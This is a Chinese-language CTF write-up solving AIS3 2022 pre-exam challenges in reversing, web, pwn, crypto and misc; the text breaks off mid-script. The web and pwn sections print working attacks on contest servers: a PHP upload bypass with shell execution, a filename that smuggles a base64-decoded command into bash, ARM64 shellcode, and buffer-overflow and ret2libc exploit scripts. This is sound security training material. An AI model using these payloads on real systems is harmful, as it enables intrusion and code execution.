# AIS3-2022-Pre-exam-Writeup

- Team: `Ice1187`
- Ranking: 2nd
- [Blog 好讀版](https://ice1187.github.io/ais3-2022-pre-exam-writeup/)

<img width="800" alt="ais3-pre-exam-scoreboard" src="https://user-images.githubusercontent.com/38059464/175545378-5b5f373e-7da8-4c96-b7d7-463e5a16caf5.png" >


## Table of Contents

* [AIS3-2022-Pre-exam-Writeup](#ais3-2022-pre-exam-writeup)
   * [Reverse](#reverse)
      * [Time Management](#time-management)
      * [Calculator](#calculator)
      * [殼](#殼)
      * [Flag Checker](#flag-checker)
      * [Rideti](#rideti)
      * [Strings](#strings)
   * [Web](#web)
      * [Poking Bear](#poking-bear)
      * [Simple File Uploader](#simple-file-uploader)
      * [Tari Tari](#tari-tari)
      * [The Best Login UI](#the-best-login-ui)
   * [Pwn](#pwn)
      * [SAAS — Crash](#saas--crash)
      * [BOF2WIN](#bof2win)
      * [Give Me SC](#give-me-sc)
      * [Magic](#magic)
      * [UTF-8 Editor — Crash](#utf-8-editor--crash)
   * [Crypto](#crypto)
      * [SC](#sc)
      * [Fast Cipher](#fast-cipher)
   * [Misc](#misc)
      * [Excel](#excel)
      * [Gift in the dream](#gift-in-the-dream)
      * [Knock](#knock)

<!-- Created by https://github.com/ekalinin/github-markdown-toc -->

## Reverse
### Time Management

1. 每次 print flag 的一個字元要等 30000 多秒。
<img width="600" alt="time-management-sleep" src="https://user-images.githubusercontent.com/38059464/176660727-2e290e6f-0d5c-44c4-b296-f1fd0978461a.png">

2. 從 `objdump` 找到要 patch 的 instruction 在 `0x122b`。
<img width="600" alt="time-management-instruct" src="https://user-images.githubusercontent.com/38059464/176661153-ef3dc1bc-751e-480f-89d2-edeef8959421.png">

3. 用 vim 打開 `chal`，然後輸入指令 `:%!xxd` 將 binary 轉成 `xxd` 的 hexdump 格式。
<img width="527" alt="time-management-convert" src="https://user-images.githubusercontent.com/38059464/176663520-977eb575-f806-43b7-9df4-b87a9487ee95.png">

4. 找到 `0x122b` 的位置即為要 patch 的部分 `0x00008763`。
<img width="600" alt="time-management-before-patch" src="https://user-images.githubusercontent.com/38059464/176662170-71bd84e7-b3c9-475e-9d6d-20109f4dfbd1.png">

5. 將其修改成 1 秒，同時也把右半部的 ASCII 改成 `.`。
<img width="600" alt="time-management-after-patch" src="https://user-images.githubusercontent.com/38059464/176662667-939556fb-5fde-4703-a23c-8d10037923b2.png">

6. 輸入指令 `:%!xxd -r` 將 hexdump revert 回 binary。
<img width="600" alt="time-management-revert" src="https://user-images.githubusercontent.com/38059464/176663015-142c69ca-0ad9-4692-815a-d126cb9e6af2.png">

7. 執行 patch 後的 binary 即可得到 flag，但因為最後會輸出 `\r`，因此要邊輸出邊按換行避免輸出被蓋掉。
<img width="600" alt="time-management-flag" src="https://user-images.githubusercontent.com/38059464/176664787-295a4753-cfaa-4479-b3ce-7bd92ddad48c.png">

**Flag: `AIS3{You_are_the_master_of_time_management!!!!!}`**

### Calculator

1. 用 [`dnSpy`](https://github.com/dnSpy/dnSpy) 打開 `Extensions` 中的各個 `AIS3.dll`，可以看到多層對輸入的檢查。
<img width="800" alt="calculator-check" src="https://user-images.githubusercontent.com/38059464/176863412-08014fae-f061-4acf-a1fa-2098ddffd515.png">

2. 使用 `z3` 找出正確的輸入即為 flag，詳細 code 可以參考 `solve.py`。

```python
from z3 import *

a = [BitVec(f'a[{i}]', 8) for i in range(46)]
solver = Solver()

solver.add(a[0] == ord('A'))

# AIS3
offset = 1
solver.add(a[14+offset] == ord('A'))
solver.add(a[3+offset] == ord('{'))
array = [30, 4, 100]
for i in range(len(array)):
    solver.add((a[i+offset] ^ ord('W')) == array[i])
print(solver.check())

# more checks...
```

**Flag: `AIS3{D0T_N3T_FRAm3W0rk_15_S0_C0mPlicaT3d__G_G}`**

### 殼

1. 如果有看過，應該會知道這是[文言](https://github.com/wenyan-lang/wenyan)，一種文言文程式語言。
<img width="947" alt="wenyan-code" src="https://user-images.githubusercontent.com/38059464/176665877-d7ad91d9-6466-4fd4-b117-c9424b3b1ca2.png">

2. 可以透過以下指令執行 `殼.wy` 和將其轉成 JavaScript。
```bash
$ npm install @wenyan/core
$ npm install js-beautify

$ ./node_modules/.bin/wenyan --dir ./chal/藏書樓/ ./chal/殼.wy   # execute
輸入「助」以獲得更多幫助
>

$ cd ./chal
$ npx --package=@wenyan/cli wenyan -c -o ../decomp.js -r --roman pinyin 殼.wy   # convert to JavaScript
$ node_modules/.bin/js-beautify ./decomp.js > decomp_beauty.js                  # beautify JavaScript
```

3. 簡單看一下 JavaScript code 可以發現輸入要以 `蛵煿 ` 開頭，然後輸入經過一些運算之後要符合 `密旗` (`MI4QI2`) 這個變數的內容。
<img width="592" alt="wenyan-decomp" src="https://user-images.githubusercontent.com/38059464/176666873-ab912dba-1218-44e0-b0bb-d01f41b87c56.png">

4. 後來實在是懶得看又醜又長的 JavaScript，觀察輸入之後發現每 3 個輸入字元決定 2 個輸出字元，因此把 mapping 建出來，就能直接從答案反推輸入了。所有組合大概有 1000000 組，最後花了 6~8 個小時建出大概 8 成的 mapping，然後反推輸入得到 flag。
<img width="1372" alt="wenyan-guess" src="https://user-images.githubusercontent.com/38059464/176668657-68797378-5fea-4173-a99a-fb3aa1289847.png">

**Flag: `AIS3{chaNcH4n_a1_Ch1k1ch1k1_84n8An_M1nNa_5upa5utA_n0_TAMa90_5a}`**

### Flag Checker

1. Bianry 需要 `GLIBC_2.33`, `GLIBC_2.34`，可以用 docker 建一個臨時的 Ubuntu 22.04 來用。
<img width="1086" alt="flag-cheker-glibc" src="https://user-images.githubusercontent.com/38059464/176669338-09ce8646-a074-47d4-a61e-fc3f1caaedc9.png">


2. 跑 Ubuntu 22.04 docker container。
```bash
$ cat Dockerfile
FROM ubuntu:22.04
RUN apt-get update && apt-get upgrade -y

COPY ./flag_checker /

$ sudo docker build -t flag-checker-demo .
$ sudo docker run -itd flag-checker-demo:latest
eccce3f0aa7eaf6dcd8548afc5a57ff5a289fbc4ff99611b4dbeadeafc41d1a8
$ sudo docker exec -it eccc /bin/bash
root@eccce3f0aa7e:/# ./flag_checker
a
Bad
```

3. 從 IDA 得知輸入開頭須為 `AIS3{`。
<img width="533" alt="flag-checker-ais3-start" src="https://user-images.githubusercontent.com/38059464/176687851-9211a505-7b70-4ca4-a28c-1308ab8e265f.png">

4. 用 `gdb` 追進去，看到 `Thread dubugging` 因此猜測可能有 call `fork` 或 `execve` 之類的 system call。用 `catch syscall` 在遇到 syscall 時中斷，發現其透過 `execve` 執行 `python`。
```gdb
pwndbg> r
Starting program: /flag_checker
warning: Error disabling address space randomization: Operation not permitted
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
^C
Program received signal SIGINT, Interrupt.
pwndbg> ni
AIS3{AAAAAAAA}
pwndbg> catch syscall
Catchpoint 1 (any syscall)
pwndbg> c
Continuing.

Catchpoint 1 (call to syscall execve), 0x00005582a84281d0 in ?? ()
pwndbg> ni
────────────────────────[ STACK ]────────────────────────
00:0000│ rsp 0x7fff7b088140 ◂— 0x4
01:0008│     0x7fff7b088148 —▸ 0x7fff7b0884dc ◂— 0x336e6f68747970 /* 'python3' */
02:0010│     0x7fff7b088150 —▸ 0x7fff7b0884e4 ◂— 0x706d695f5f00632d /* '-c' */
03:0018│     0x7fff7b088158 —▸ 0x7fff7b0884e7 ◂— 0x74726f706d695f5f ('__import')
04:0020│     0x7fff7b088160 —▸ 0x7fff7b0888fd ◂— 'AAAAAAAA}'
05:0028│     0x7fff7b088168 ◂— 0x0
06:0030│     0x7fff7b088170 —▸ 0x7fff7b088907 ◂— 'LESSOPEN=| /usr/bin/lesspipe %s'
07:0038│     0x7fff7b088178 —▸ 0x7fff7b088927 ◂— 'HOSTNAME=73648dfc4d1a'
```
<img width="800" alt="flag-checker-see-python" src="https://user-images.githubusercontent.com/38059464/176689285-713021ea-b4e7-4ad7-b158-4c8d279bf6f8.png">

5. 用 `dump` 把執行的 command 拉出來。
<img width="800" alt="flag-checker-dump-python" src="https://user-images.githubusercontent.com/38059464/176690786-295fef4c-9da4-41e7-ae60-846c1fa5d3a7.png">
<img width="800" alt="flag-checker-python-cmd" src="https://user-images.githubusercontent.com/38059464/176691230-ed335cfd-771c-4ba4-b317-9d5447cf3919.png">

6. 用 [`picktools`](https://docs.python.org/3/library/pickletools.html) disassemble pickle code，可以參考 script `disasm.py`。
<img width="800" alt="flag-checker-disasm" src="https://user-images.githubusercontent.com/38059464/176692533-fa7bf77f-2e7f-44b5-81e8-1e8b2c805c3c.png">

7. 讀一下 disassemble 的 pickle，還原其 check 大致如下：
<img width="1384" alt="flag-checker-rsa-like-check" src="https://user-images.githubusercontent.com/38059464/176693484-340d42d5-702c-4c87-b4a4-3b180087e0ff.png">

8. 觀察上述 check 可發現，此算法與 RSA 十分相似：`a` 是明文，`b` 是密文，`65537` 是 `e`，一長串模數是 `N`，只差在 [`N` 本身即是質數](http://factordb.com/index.php?query=542732316977950510497270190501021791757395568139126739977487019184541033966691938940926649138411381198426866278991473)，而不是兩個質數的積。但這並不影響 RSA decrypt 的運算，因此可以用以下方法還原輸入，得到 flag。
```python
from Crypto.Util.number import inverse

# RSA-like solution
n = 542732316977950510497270190501021791757395568139126739977487019184541033966691938940926649138411381198426866278991473
r = n-1    # n is a prime, so r = phi(n) = n-1
e = 65537
d = inverse(e, r)
c = 451736263303355935449028567064392382249020023967373174925770068593206982683303653948838172763093279548888815048027759
m = pow(c, d, n)
flag = m.to_bytes(64, 'big').strip(b'\x00').decode()
flag = 'AIS3{' + flag

print(flag)
```

**Flag: `AIS3{from_rop_to_python_to_pickle_to_math}`**

### Rideti

1. 字串中的 `@CONGRATULATIONS!` 應該是我們的目標。
<img width="589" alt="rideti-strings" src="https://user-images.githubusercontent.com/38059464/176874153-6c012257-c844-4f0d-8a03-aa7cf079f50d.png">

2. IDA 不認得 string。觀察字串的使用方式後，可以建出 `my_string` struct 然後 apply 到字串上。
<img width="879" alt="rideti-my-string" src="https://user-images.githubusercontent.com/38059464/176874522-07ab2d89-402d-46d4-b86e-7b86724d4826.png">

3. 經過一番逆向後，可以發現去到勝利畫面 `scene_final` 的條件為 `scene_state = 2`，而當分數 `score = 3962971405739` 時，`scene_state` 被設成 2。

<img width="623" alt="rideti-scene-final" src="https://user-images.githubusercontent.com/38059464/176875514-7adf1c53-0eac-4d3d-b37f-8bea4acb5cee.png">

<img width="681" alt="rideti-set-scene-2" src="https://user-images.githubusercontent.com/38059464/176875762-a279a0cc-25d3-4768-a2b2-c13f4b4dd793.png">

4. 用 [`x64dbg`](https://x64dbg.com) 在走到 check 時手動把 `score` 改成 `3962971405739` 即可拿到 flag。`x64dbg` 使用教學可以參考[這個](https://morosedog.gitlab.io/categories/x64dbg/page/4/)。

<img width="727" alt="rideti-flag" src="https://user-images.githubusercontent.com/38059464/176876978-cc14e03d-32e7-4929-a672-fb5082393f18.png">

**Flag: 沒有存到當時給的 flag 字體的網站，所以就看圖吧**


### Strings

1. 既然題目叫 `Strings`，就先 `strings` 一下，可以發現類似 flag 的字串。
<img width="800" alt="strings-likely-flag" src="https://user-images.githubusercontent.com/38059464/176866947-dc777d95-7e64-4370-8867-af7e0cdb2558.png">

2. 此題為 Rust binary，IDA 的 decompile 很難看，直接看 disassembly graph 會好一點。經過一番動靜態混合的分析，可以找到輸入從 `my_readline` 讀入。
<img width="747" alt="strings-my_readline" src="https://user-images.githubusercontent.com/38059464/176865770-f7527f18-a247-4ba3-9172-9b24ae662d08.png">

3. 將輸入 `trim` 過之後，以 `_` 為分隔做 `split`。
<img width="800" alt="strings-trim-split" src="https://user-images.githubusercontent.com/38059464/176866068-7bb79a10-e436-4428-80f1-38a989767843.png">

4. `split` 之後存入 `vec` 型態，然後進入共 11 次的 loop。由此可以猜測 flag 裡應該由 10 個 `_` 和 11 個字串組合而成。

<img width="759" alt="strings-11-loop" src="https://user-images.githubusercontent.com/38059464/176867065-ed4d987a-c9c4-4366-8e9e-b503cfe1e413.png">

5. loop 裡 `memcpy` 了 11 個 integer `some_index`，然後用這些 integer 去 index 最一開始看到的類似 flag 的字串 `FLAG`，再和輸入進行比較。因此猜測這 11 個數字便是 `FLAG` 裡組成 flag 的字串的 index。

<img width="800" alt="strings-memcpy-flag" src="https://user-images.githubusercontent.com/38059464/176867668-cc0d418b-b9a6-4b2b-bf74-fcfb4206f8ff.png">

<img width="348" alt="strings-some-index" src="https://user-images.githubusercontent.com/38059464/176869148-23affeb7-168a-4652-9f0f-9d58fc3b7a49.png">

6. 驗證上述猜測便是 flag。

```python
flags = ['AIS3{', 'good', 'luck', 'finding', 'the', 'flags', 'value', 'using', 'strings',
         'command', 'guess', 'which', 'substring', 'is', 'our', 'actual', 'answer', 'lmaoo', '}']
indexes = [0, 0x4, 0x10, 0xd, 0xa, 0x4, 0x8, 0x7, 0x1, 0x2, 0x12]

flag = []
for i in indexes:
    flag.append(flags[i])

print('_'.join(flag))
```

**Flag: `AIS3{_the_answer_is_guess_the_strings_using_good_luck_}`**

## Web
### Poking Bear

1. 網頁上顯示的 bear 的 URL 為 `/bear/<n>`，因此猜測要找的 bear 應該也是同樣的格式。

2. 產生 `0` ~ `1000` 的 wordlist `bear.txt`，然後用 `ffuf` 進行爆搜，並將沒有 bear 的結果過濾掉。找到唯一不在網頁上的 bear `499` 即為 secret bear。
```bash
$ ffuf -u http://chals1.ais3.org:8987/bear/FUZZ -w ./bear.txt | grep -v 'Size: 1358 ./fuzz_bear.txt
5                       [Status: 200, Size: 1742, Words: 295, Lines: 42]
29                      [Status: 200, Size: 1743, Words: 295, Lines: 42]
82                      [Status: 200, Size: 1743, Words: 295, Lines: 42]
327                     [Status: 200, Size: 1744, Words: 295, Lines: 42]
350                     [Status: 200, Size: 1740, Words: 295, Lines: 42]
499                     [Status: 200, Size: 1847, Words: 335, Lines: 46]
777                     [Status: 200, Size: 1744, Words: 295, Lines: 42]
999                     [Status: 200, Size: 1744, Words: 295, Lines: 42]
```

3. 需要成為 `bear poker`，因此將 Cookie 的 `human` 設成 `bear poker`，再 poke 一次就拿到 flag。
```bash
$ curl http://chals1.ais3.org:8987/bear/499
Hello human, you need to be a "bear poker" to poke the SECRET BEAR.
$ curl http://chals1.ais3.org:8987/poke -H 'Cookie: human=bear poker' -d 'bear _id=499' -H 'Content-Type: application/x-www-form-urlencoded'
<script>alert(`AIS3{y0u_P0l<3_7h3_Bear_H@rdLy><}`); location='/'</script>
```

**Flag: `AIS3{y0u_P0l<3_7h3_Bear_H@rdLy><}`**

### Simple File Uploader

1. 不能上傳 `php`, `php2`, `php3`, `php4`, `php5`, `php6`, `phar`, `phtm`，可以用 `pHP` bypass 檢查。
2. Ban 掉一堆危險 function，可以用 `` ` `` 執行 shell command 讀取 flag。

```php
<?php
echo(`/rUn_M3_t0_9et_fL4g`);
?>
```

**Flag: 忘了留...**

### Tari Tari
1. 上傳 `trash.txt` 後，網頁提供的下載網址為 `http://chals1.ais3.org:9453/download.php?file=MjY1MDEwZmI2MDg2NGU1MGFjZTg5Y2RkYjE4ZmQxZjIudGFyLmd6&name=trash.txt.tar.gz`。把 `file` base64 decode 得到 `265010fb60864e50ace89cddb18fd1f2.tar.gz`，由此猜測 `file` 可以讀取任意檔案。

2. 讀取 `index.php`，發現其使用 `passthru` 執行 shell command，而 `$filename` 為使用者可控，因此可以 RCE。
```php
$filename = $file['name'];
$path = bin2hex(random_bytes(16)) . ".tar.gz";
$source = substr($file['tmp_name'], 1);
$destination = "./files/$path";
passthru("tar czf '$destination' --transform='s|$source|$filename|' --directory='/tmp' '/$source'", $return);
```

3. 上傳檔案即可讀到 flag。
```bash
$ echo abc >  "'|| echo $(echo -n cat /y000000_i_am_the_f14GGG.txt | base64) | base64 -d | bash;#"
$ ls
total 32K
-rw-r--r-- 1 ice1187 ice1187    0 May 15 18:16 ''\''|| echo Y2F0IC95MDAwMDAwX2lfYW1fdGhlX2YxNEdHRy50eHQ= | base64 -d | bash;#'
```

**Flag: `AIS3{test_flag (to be changed)}`**  (這個 flag 有夠迷惑...)

### The Best Login UI

1. `bodyParser.urlencoded` 中設定 `extended = true`，表示 [HTTP 傳入的參數會被當作 object](https://www.npmjs.com/package/body-parser#extended)，而非 string。再加上使用 MongoDB，因此可以嘗試 NoSQL injection。
<img width="556" alt="the-best-login-ui-extended" src="https://user-images.githubusercontent.com/38059464/176656006-0c26cfd0-bfbc-4bda-8651-2e4b81e21344.png">

2. 確認可以做 NoSQL injection ([MongoDB query syntax](https://www.mongodb.com/docs/manual/reference/operator/query/))。
<img width="654" alt="the-best-login-ui-nosql-injection" src="https://user-images.githubusercontent.com/38059464/176657306-5a465ed2-8004-480b-8546-3b3c0a6f68eb.png">

3. 使用 [`$regex`](https://www.mongodb.com/docs/manual/reference/operator/query/regex/#mongodb-query-op.-regex) 把 flag 爆出來，當時寫的 script 超醜就不貼了...。

**Flag: `AIS3{Bl1nd-b4s3d r3gex n0sq1i?! (:3[___]}`**

## Pwn

### SAAS — Crash

1.  `String` 的 [destructor](https://en.cppreference.com/w/cpp/language/destructor) 會把 `str` delete 掉，但沒有把 `str` 設回 `nullptr`，留下 dangling pointer。而 `print` 會呼叫 [copy constructor](https://en.cppreference.com/w/cpp/language/copy_constructor) 把 `s` 的 member 都 copy 過來，然後在 `print` 結束時呼叫 `String` 的 destructor 把 `s` 清掉，因此只要連續 `print` 兩次，就可以 double free `s.str`。
```cpp
class String {
   public:
	char *str;
	size_t len;

	String(const char *s) {
		len = strlen(s);
		str = new char[len + 1];
		strcpy(str, s);
	}
	~String() { delete[] str; }
};

void print(String s) {
	printf("Length: %zu\n", s.len);
	printf("Content: ");
	write(1, s.str, s.len);
	printf("\n");
}
```

2. 建立 string 之後 print 兩次得到 flag。

```bash
===== S(tring)AAS =====
1. Create string
2. Edit string
3. Print string
4. Delete string
> 1
Index: 0
Content: aaaa
===== S(tring)AAS =====
1. Create string
2. Edit string
3. Print string
4. Delete string
> 3
Index: 0
Length: 4
Content: aaaa
===== S(tring)AAS =====
1. Create string
2. Edit string
3. Print string
4. Delete string
> 3
Index: 0
Length: 4
Content:
free(): double free detected in tcache 2
Aborted (core dumped)
```

**Flag: `AIS3{congrats_on_crashing_my_editor!_but_can_you_get_shell_from_it?}`**

### BOF2WIN

1. 純粹的 stack buffer overflow。
```python
from pwn import *

p = remote('127.0.0.1', 12347)
p = remote('chals1.ais3.org', 12347)

flag_adr = 0x401216

payload = b'A'*24
payload += flag_adr.to_bytes(8, 'little')

p.recv()
p.sendline(payload)
print(p.recv())
print(p.recv().strip(b'\x00').decode())
```

**Flag: `AIS3{Re@1_B0F_m4st3r!!}`**

### Give Me SC

1. 不會寫 ARM64 shellcode 就上網找一份來用。

```python
from pwn import *

p = remote('127.0.0.1', 15566)
p = remote('chals1.ais3.org', 15566)

# ref: https://www.exploit-db.com/exploits/47048
shellcode = b"\xe1\x45\x8c\xd2\x21\xcd\xad\xf2\xe1\x65\xce\xf2\x01\x0d\xe0\xf2\xe1\x8f\x1f\xf8\xe1\x03\x1f\xaa\xe2\x03\x1f\xaa\xe0\x63\x21\x8b\xa8\x1b\x80\xd2\xe1\x66\x02\xd4"

p.recv()
p.send(b'AAAA')
p.recv()
p.send(shellcode)
print(p.recv())
p.sendline(b'cat home/give_me_sc/flag')
print(p.recv().decode())
print(p.recv().decode())
# p.interactive()
```

**Flag: `AIS3{Y0uR_f1rst_Aarch64_Shellcoding}`**

### Magic

1. 嘗試幾次輸入之後，會發現有時候會突然 read 或 write 很多 bytes。
2. 用 `gdb` 追進去發現正常 `read` 結束後會另外計算 `read` 和 `write` 的次數。

```python
   0x401d06    push   rax
   0x401d07    push   rdi
   0x401d08    push   rsi
   0x401d09    push   rdx
   0x401d0a    mov    rax, 1
   0x401d11    mov    rdi, 0
   0x401d18    mov    rsi, 0x404f20
   0x401d1f    mov    rdx, 5
   0x401d26    syscall              // write(stdout, 0x404f20, 5)
   0x401d28    pop    rdx
   0x401d29    pop    rsi
   0x401d2a    pop    rdi
   0x401d2b    pop    rax
   0x401d2c    mov    rax, 0x404f00
   0x401d33    add    qword ptr [rax], 1
   0x401d37    mov    rax, qword ptr [rax]
   0x401d3a    mov    rbx, 0x404f08
   0x401d41    mov    rbx, qword ptr [rbx]
   0x401d44    mov    r8, 0x404f10          // original read
   0x401d4b    mov    r8, qword ptr [r8]
   0x401d4e    cmp    rax, 0xe     // check: [0x404f00] == 0xe
   0x401d52    jne    0x401d61
   0x401d54    cmp    rbx,0x8      // check: [0x404f08] == 0x8
   0x401d58    jne    0x401d61
   0x401d5a    mov    rdx,0x1000
   0x401d61    jmp    r8
```

3. `write` 也有同樣的操作。

```python
   0x401e00    push   rax
   0x401e01    push   rdi
   0x401e02    push   rsi
   0x401e03    push   rdx
   0x401e04    mov    rax,0x1
   0x401e0b    mov    rdi,0x0
   0x401e12    mov    rsi,0x404f28
   0x401e19    mov    rdx,0x5
   0x401e20    syscall
   0x401e22    pop    rdx
   0x401e23    pop    rsi
   0x401e24    pop    rdi
   0x401e25    pop    rax
   0x401e26    mov    rax,0x404f08
   0x401e2d    add    QWORD PTR [rax],0x1
   0x401e31    mov    rax,QWORD PTR [rax]
   0x401e34    mov    rbx,0x404f00
   0x401e3b    mov    rbx,QWORD PTR [rbx]
   0x401e3e    mov    r8,0x404f18
   0x401e45    mov    r8,QWORD PTR [r8]
   0x401e48    cmp    rax,0x3
   0x401e4c    jne    0x401e5b
   0x401e4e    cmp    rbx,0x7
   0x401e52    jne    0x401e5b
   0x401e54    mov    rdx,0x100
   0x401e5b    jmp    r8
```

4. 整理一下可以發現當 `read` 2 次、 `write` 3 次時可以 read 0x100 bytes，而當 `read` 3 次、 `write` 8 次時可以寫 0x1000 bytes。各個 memory 紀錄的數值如下：

  - `[0x404f00]` counts how many time read been called
  - `[0x404f08]` counts how many time write been called
  - `[0x404f10]` original read
  - `[0x404f18]` original write

5. 因此我們可以用 `read` 0x100 bytes 來 leak glibc (libc version 可從提供的 container 得知)，然後用 `write` 0x1000 bytes 做 ret2libc。

```python
from pwn import *

#p = remote('127.0.0.1', 12348)
p = remote('chals1.ais3.org', 12348)
debug = False

#p = process('./magic/share/magic')
#p = gdb.debug('./magic/share/magic', gdbscript='continue')
#debug = True

def read():
    print('[*] Reading')
    print(p.recvuntil(b'> '))
    p.sendline(b'w')
    data = p.recvuntil(b'read')[:-4]
    print('[*] Read', data)
    return data

def write(data=b'A'):
    print('[*] Writing')
    print(p.recvuntil(b'> '))
    p.sendline(b'r')
    p.send(data)
    print('[*] Written', data)
    return

def super_read():
    write()
    write()
    read()
    read()
    data = read()
    return data

def super_write(payload):
    for _ in range(5):
        read()
    write(payload)

# leak libc: version libc6_2.31-0ubuntu9.2_amd64
leak = super_read()
print('leak:', leak)

if debug:
    libc = int.from_bytes(leak[22:22+8], 'little') - 0x240b3
else:
    libc = int.from_bytes(leak[27:27+8], 'little') - 0x240b3
print(f'[+] Libc base: {libc:#2x}')
padding = b'A'*22
system = libc + 0x522c0
bin_sh = libc + 0x1b45bd
pop_rdi = 0x401313
ret = 0x40101a

payload = padding
payload += p64(pop_rdi)
payload += p64(bin_sh)
payload += p64(ret)
payload += p64(system)
print(payload)
super_write(payload)
p.sendline(b'c')
p.interactive()

```

**Flag: `AIS3{ma4a4a4aGiCian}`**


### UTF-8 Editor — Crash

1. 輸入 `你ㄏ`，讓 `ㄏ` 注音組字的階段，然後刪掉 `你ㄏ`，會留下一個類似空白的東西，輸入進去，然後 print 就解了。
2. 猜測應該是我的環境有一些編碼問題之類的，肯定不是 intended XD

**Flag: `AIS3{unsigned_intergers_are_so_cool}`**

## Crypto

### SC

1. `cipher.py` 建立隨機的 substitution cipher，然後給我們替換過後的 `cipher.py.enc` 和 `flag.txt.enc`。因為 `cipher.py.enc` 有足夠多字元，因此我可以用它重建 substitution 的 mapping，然後把 `flag.txt.enc` decrypt 回來。

```python
import string

charset = list(string.ascii_lowercase + string.ascii_uppercase + string.digits)
enc_charset = [None for _ in range(len(charset))]

print(charset)

txt = open('./cipher.py', 'r').read()
enc = open('./cipher.py.enc', 'r').read()

for i in range(len(txt)):
    c = txt[i]
    enc_c = enc[i]
    if c in charset:
        idx = charset.index(c)
        enc_charset[idx] = enc_c


charset = ''.join(charset)
enc_charset = ''.join([x if x is not None else '@' for x in enc_charset])

T = str.maketrans(enc_charset, charset)

with open('./flag.txt.enc', 'r') as f:
    enc_flag = f.read()
print(enc_flag.translate(T))
```

**Flag: `AIS3{s0lving_sub5t1tuti0n_ciph3r_wi7h_kn0wn_p14int3xt_4ttack}`**

### Fast Cipher

1. 因為會和 `0xff` 取 bitwise and，因此只要找到和初始的 `key` 最後一個 byte 相同的數即可。(應該是這樣吧，我也沒有非常確定我的思路是不是對的...)。
```python
from secrets import randbelow

M = 2**1024

def f(x):
    # this is a *fast* function
    return (
        4 * x**4 + 8 * x**8 + 7 * x**7 + 6 * x**6 + 3 * x**3 + 0x48763
    ) % M

def encrypt(pt, key):
    ct = []
    for c in pt:
        ct.append(c ^ (key & 0xFF))
        key = f(key)
    return bytes(ct)

if __name__ == "__main__":
    key = randbelow(M)
    ct = encrypt(open("flag.txt", "rb").read().strip(), key)
    print(ct.hex())
```

2. 寫個 script 爆搜一下，馬上就能算出 flag。

```python
M = 2**1024

with open('./output.txt', 'r') as f:
    enc_flag = f.read().strip()
enc_flag = int(enc_flag, 16).to_bytes(64, 'big').strip(b'\x00')

def f(x):
    # this is a *fast* function
    return (
        4 * x**4 + 8 * x**8 + 7 * x**7 + 6 * x**6 + 3 * x**3 + 0x48763
    ) % M

def decrypt(key):
    flag = ''
    for e in enc_flag:
        flag += chr(e ^ (key & 0xff))
        key = f(key)
    if 'AIS3' in flag:
        print(flag)
        exit(0)

for k in range(2**1024):
    tmp = ''
    tmp_k = k
    for c in enc_flag[:4]:
        tmp += chr(c ^ (tmp_k & 0xff))
        tmp_k = f(tmp_k)
    if tmp == 'AIS3':
        print('repeat!', k)
        decrypt(k)
        break
```

**Flag: `AIS3{not_every_bits_are_used_lol}`**

## Misc

### Excel

1. `xlsm` 是包含 macro 的 xls 檔，可以用 `unzip` 解開，然後在 `xl/macrosheets/` 找到 macro sheet `sheet1.xml`。
2. 跟 Execl 和 macro 實在不熟，最後直接寫個 script hardcode to win...。

```python
# from chal/xl/macrosheets/sheet1.xml
a = '''
FORMULA(mqLen!D14&amp;Mment!BA10&amp;coCGA!S17&amp;coCGA!Q19&amp;KRnsl!L19&amp;Mment!F3&amp;coCGA!G26&amp;coCGA!O23&amp;coCGA!P3&amp;coCGA!K12&amp;KRnsl!J19&amp;KRnsl!C11&amp;coCGA!N3&amp;mqLen!E4&amp;coCGA!D11&amp;KRnsl!T5&amp;JVHco!K10&amp;mqLen!BA14&amp;Mment!W1&amp;KRnsl!U13&amp;KRnsl!V9&amp;mqLen!C12&amp;KRnsl!J4&amp;Mment!Y19&amp;mqLen!K19&amp;JVHco!F2&amp;mqLen!K10&amp;coCGA!Z15&amp;mqLen!N21&amp;Mment!N1&amp;Mment!S2&amp;coCGA!X2&amp;Mment!D16&amp;coCGA!U26&amp;coCGA!R1&amp;mqLen!V9&amp;mqLen!R11&amp;Mment!X1&amp;coCGA!D5&amp;KRnsl!Z19&amp;mqLen!BA4&amp;coCGA!Z9&amp;coCGA!G7&amp;mqLen!U10&amp;Mment!U11&amp;coCGA!G18&amp;JVHco!V1&amp;mqLen!O26&amp;Mment!G5&amp;KRnsl!H22&amp;Mment!P10&amp;JVHco!W17&amp;Mment!F8&amp;coCGA!L15&amp;coCGA!H3&amp;KRnsl!U17&amp;KRnsl!BA11&amp;coCGA!X12&amp;KRnsl!F14&amp;Mment!B10&amp;KRnsl!V12&amp;Mment!U12&amp;coCGA!P14&amp;coCGA!Y1&amp;JVHco!B10&amp;JVHco!F16&amp;KRnsl!Q26&amp;Mment!P25&amp;KRnsl!M3&amp;KRnsl!I26&amp;mqLen!L15&amp;mqLen!V25&amp;KRnsl!G2&amp;Mment!I18&amp;Mment!M4&amp;KRnsl!C7&amp;JVHco!N5&amp;KRnsl!M19&amp;Mment!J9&amp;Mment!I7&amp;coCGA!G13&amp;KRnsl!M12&amp;mqLen!X2&amp;mqLen!M1&amp;JVHco!P3&amp;KRnsl!S12&amp;Mment!U10&amp;JVHco!D16&amp;mqLen!P17&amp;KRnsl!I5&amp;coCGA!W24&amp;JVHco!E10&amp;Mment!B8&amp;coCGA!C14&amp;JVHco!Z15&amp;Mment!BA11&amp;coCGA!F19&amp;KRnsl!Z2&amp;JVHco!D13&amp;Mment!O2&amp;KRnsl!D19&amp;Mment!K19&amp;Mment!U20&amp;JVHco!Q9&amp;KRnsl!I17&amp;coCGA!X17&amp;JVHco!Q24&amp;KRnsl!Q4&amp;coCGA!N21&amp;coCGA!W11&amp;JVHco!E17&amp;mqLen!H19&amp;KRnsl!X6&amp;coCGA!N26&amp;coCGA!N18&amp;KRnsl!Q17&amp;JVHco!J25&amp;KRnsl!Z16&amp;mqLen!P13&amp;coCGA!Z21&amp;JVHco!C24&amp;Mment!X19&amp;Mment!O21,A137)
'''.strip()
a = a[8:-6]
a = a.replace('&amp;', '&')
a = a.split('&')

# hardcore...
flag = ''
for i in a:
    c = input(f'{i} >')
    if c.isnumeric():
        c = chr(int(c))
    flag += c
print(flag)
```

**Flag: ` AIS3{XLM_iS_to0_o1d_but_co0o0o00olll!!}`**

### Gift in the dream

1. `strings` GIF 檔可以看到一些 hint，因此猜測 flag 跟 GIF 中每個 frame 的 duration 有關。寫個 script print 出來看看。

```python
from PIL import Image

# ref: https://stackoverflow.com/questions/53364769/get-frames-per-second-of-a-gif-in-python

